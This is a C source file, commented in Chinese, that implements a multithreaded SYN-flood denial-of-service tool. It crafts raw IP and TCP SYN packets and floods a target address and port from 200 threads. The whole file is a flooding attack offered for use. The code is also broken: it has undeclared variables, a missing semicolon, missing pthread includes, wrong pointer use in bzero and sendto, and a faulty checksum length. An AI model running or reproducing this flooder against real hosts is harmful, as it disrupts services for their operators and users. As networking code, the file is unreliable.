#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>



unsigned int target_ip;
unsigned short target_port;
int sockfd;

static int alive = -1; //程序活动标志
// 定义IP首部结构体
struct iphdr
{
    unsigned char       ver_and_hdrlen;// 版本号与IP头部长度
    unsigned char       tos;           // 服务类型
    unsigned short      total_len;     // 总长度（首部和数据之和的长度）
    unsigned short      id;            // IP包ID
    unsigned short      flags;         // 标志位(包括分片偏移量)
    unsigned char       ttl;           // 生命周期
    unsigned char       protocol;      // 上层协议
    unsigned short      checksum;      // 校验和
    unsigned int        srcaddr;       // 源IP地址
    unsigned int        dstaddr;       // 目标IP地址
};

//定义tcp首部结构体
struct tcphdr
{
    unsigned short      sport;    // 源端口
    unsigned short      dport;    // 目标端口
    unsigned int        seq;      // 序列号
    unsigned int        ack_seq;  // 确认号
    unsigned char       len;      // 首部长度
    unsigned char       flag;     // 标志位
    unsigned short      win;      // 窗口大小
    unsigned short      checksum; // 校验和
    unsigned short      urg;      // 紧急指针
};

//伪tcp首部结构体
struct pseudohdr
{
    unsigned int        saddr;//源IP
    unsigned int        daddr;//目标IP
    char                zeros;//8位保留字节，为0
    char                protocol;//传输层协议号。tcp为6
    unsigned short      length;//16位tcp报文长度（tcp首部+数据）
};

/* CRC16校验 */
unsigned short inline
checksum (unsigned short *buffer, unsigned short size)     
{  

	unsigned long cksum = 0;
	
	while(size>1){
		cksum += *buffer++;
		size  -= sizeof(unsigned short);
	}
	
	if(size){
		cksum += *(unsigned char *)buffer;
	}
	
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);		
	
	return((unsigned short )(~cksum));
}
// 初始化各种头部信息
void init_header(struct iphdr *ip, struct tcphdr *tcp, struct pseudohdr *pse)
{
	int len = sizeof(struct iphdr) + sizeof(struct tcphdr); //总长度（首部和数据之和的长度）
	
	//初始化IP首部
	ip->ver_and_hdrlen = (4<<4 | sizeof(struct iphdr)/sizeof(unsigned int));;// 版本号与IP头部长度
    ip->tos = 0;           // 服务类型
    ip->total_len = htons(len);     // 总长度（首部和数据之和的长度）
    ip->id = 1;            // IP包ID
    ip->flags = 0x40;         // 标志位(包括分片偏移量)
    ip->ttl = 255;           // 生命周期
    ip->protocol = IPPROTO_TCP;      // 上层协议
    ip->checksum = 0;      // 校验和
    ip->srcaddr = 0;       // 源IP地址
    ip->dstaddr = target_ip;       // 目标IP地址
	
	//初始化tcp首部
	tcp->sport = htons( rand()%25535);    // 源端口
    tcp->dport = htons(target_port);    // 目标端口
    tcp->seq = htonl(rand());      // 序列号
    tcp->ack_seq = 0;  // 确认号
    tcp->len = (sizeof(struct tcphdr)/4<<4|0);      // 首部长度
    tcp->flag = 0x02;     // 标志位
    tcp->win = htons(2048);      // 窗口大小
    tcp->checksum = 0; // 校验和
    tcp->urg = 0;      // 紧急指针
	
	//初始化tcp伪首部
	pse->saddr = rand();//源IP
    pse->daddr = target_ip;//目标IP
    pse->zeros = 0;//8位保留字节，为0
    pse->protocol = IPPROTO_TCP;//传输层协议号。tcp为6
    pse->length = htons(sizeof(struct pseudohdr));//16位tcp报文长度（tcp首部+数据）
}

/* 信号处理函数,设置退出变量alive */
void 
sig_int(int signo)
{
	alive = 0;
}

//发包函数
void send_synflood(void* args)
{
	struct sockaddr_in skaddr;
	char buf[100] , sendbuf[100];
	int pkt_len = 0;
	struct iphdr ip; //IP首部
	struct tcphdr tcp; //tcp首部
	struct pseudohdr pse;//tcp伪首部
	
	bzero(skaddr, sizeof(skaddr));
	skaddr.sin_family = AF_INET;
    skaddr.sin_port = htons(target_port);
    skaddr.sin_addr.s_addr = target_ip;
	pkt_len = sizeof(iphdr) + sizeof(tcphdr);
	srand((unsigned)time(NULL));

	while(alive)
	{
	// 初始化头部信息
	init_header(&ip, &tcp, &pse);
	
	//计算IP校验和
	ip.checksum = checksum((u_short *)&ip, sizeof(ip));
	// 计算TCP校验和
	bzero(buf, sizeof(buf));
	memcpy(buf , &pse, sizeof(pse));           // 复制TCP伪头部
    memcpy(buf + sizeof(pse), &tcp, sizeof(tcp)); // 复制TCP头部
    tcp.checksum = checksum((u_short *)buf, sizeof(pse) + sizeof(tcp));
	
	bzero(sendbuf, sizeof(sendbuf));
    memcpy(sendbuf, &ip, sizeof(ip));
    memcpy(sendbuf + sizeof(ip), &tcp, sizeof(tcp));
	
	if(sendto(sockfd, sendbuf, pkt_len, 0, (struct sockaddr *) skaddr, sizeof(struct sockaddr))<0)
	{
		perror("sendto()");
	}
	}
}




//启动函数
int main(int argc, char *argv[])
{
	/* 截取信号CTRL+C */
	alive = 1;
	signal(SIGINT, sig_int);
	//接收参数
	if (argc < 3) {
     	fprintf(stderr, "Usage: test <address> <port>\n");
        exit(1);
    }
    target_ip = inet_addr(argv[1]);
    target_port = atoi(argv[2]);
    if (target_port < 0 || target_port > 65535) {
        fprintf(stderr, "Invalid destination port number: %s\n", argv[2]);
		exit(1);
    }
	printf("syn>>> ip:%d port:%d",target_ip,target_port)
	
	/* 建立原始socket */
	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
	if (sockfd < 0)	   
	{
		perror("socket()");
		exit(1);
	}
	/* 设置IP选项 */
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
	{
		perror("setsockopt()");
		exit(1);
	}
	
	/* 将程序的权限修改为普通用户 */
	setuid(getpid());
	int i = 0;
	int num = 200;
	pthread_t pthread[num];//在创建线程之前要先定义线程标识符th，相当于int a这样
	/* 建立多个线程协同工作 */
	for(i=0; i<num; i++)
	{
		err = pthread_create(&pthread[i], NULL, send_synflood, &pthread[i]);
		if(err != 0)
		{
			perror("pthread_create()");
			exit(1);
		}
	}
	/*第一个参数是要创建的线程的地址
	第二个参数是要创建的这个线程的属性，一般为NULL
	第三个参数是这条线程要运行的函数名
	第四个参数三这条线程要运行的函数的参数*/
	
	/* 等待线程结束 */
	for(i=0; i<num; i++)
	{
		err = pthread_join(pthread[i], NULL);
		if(err != 0)
		{
			perror("pthread_join Error\n");
			exit(1);
		}
	}
	/*线程等待函数，等待子线程都结束之后，整个程序才能结束
	第一个参数是子线程标识符，第二个参数是用户定义的指针用来存储线程结束时的返回值*/
	close(sockfd);//关闭套接字

	return 0;
	
}